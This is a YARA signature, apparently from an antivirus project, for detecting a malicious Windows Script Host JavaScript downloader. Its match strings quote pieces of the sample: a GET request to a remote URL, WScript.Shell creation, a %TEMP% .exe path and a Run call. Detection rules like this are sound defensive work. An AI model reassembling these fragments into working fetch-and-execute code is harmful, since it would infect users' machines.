rule sig_20160328_1be95e521e011a5a7094462ed97d71ce {
  meta:
    description = "datamaliciousorder - file 20160328_1be95e521e011a5a7094462ed97d71ce.js"
    author      = "HydraDragonAntivirus"
    reference   = "https://github.com/HydraDragonAntivirus"
    date        = "2026-04-26"
    hash1       = "441c0b1bf5c8ae78513f4942e481836695e28a9be09366b1ed811852875bbf4e"

  strings:
    $s1  = "function Pddzm() {return Bongmf[\"ExpandEnvironmentStrings\"](\"%TEMP%/\") + \"4zwfNca1eTNM8G6J.exe\";};" fullword ascii
    $s2  = "Gsswgy[Dpddmte](\"GET\", \"http://bbwsa.com/m7rysa\", false);" fullword ascii
    $s3  = "do {WScript[Hdxym](Kenig() * 11)} while (Gsswgy[\"readystate\"] < 4 );" fullword ascii
    $s4  = "var Bongmf = function Naprtdux() {return WScript[Jkupima](\"WScript.Shell\");}();" fullword ascii
    $s5  = "function Pzxtvxwvpo(Oyrepxoxr, Zuywmvxx){return Oyrepxoxr - Zuywmvxx;};" fullword ascii
    $s6  = "function Yjcmez() {return ((Hhlluhvdsl == true) && (Hhlluhvdsl == Ibunnje)) ? 1 : Pfuwln;};" fullword ascii
    $s7  = "function Axcylnzzuj(Wdmtmu){Bongmf[\"Run\"](Wdmtmu, Pfuwln, Pfuwln);};" fullword ascii
    $s8  = "function Zqost(Zklym) {var Socenu = (1, 2, 3, 4, 5, Zklym); return Socenu;};" fullword ascii
    $s9  = "function Bilpckqtox()" fullword ascii
    $s10 = "function Uyxjarr(){return Mkryptvlr;};" fullword ascii
    $s11 = "var Qykxnumskc = false;" fullword ascii
    $s12 = "var Ibunnje = false;" fullword ascii
    $s13 = "var Hhlluhvdsl = false;" fullword ascii
    $s14 = "return Pzxtvxwvpo(Jdzjsso, Eowvl);" fullword ascii
    $s15 = "var Dmnjpmmtt = new this[\"Date\"]();" fullword ascii
    $s16 = "Hhlluhvdsl = true; " fullword ascii
    $s17 = " while (Aqluk){" fullword ascii
    $s18 = "function Kenig(){return 22;};" fullword ascii
    $s19 = "Ibunnje = true; " fullword ascii
    $s20 = "function Ozlwdx(){return Jkupima;};" fullword ascii

  condition:
    uint16(0) == 0x6176 and
    8 of them
}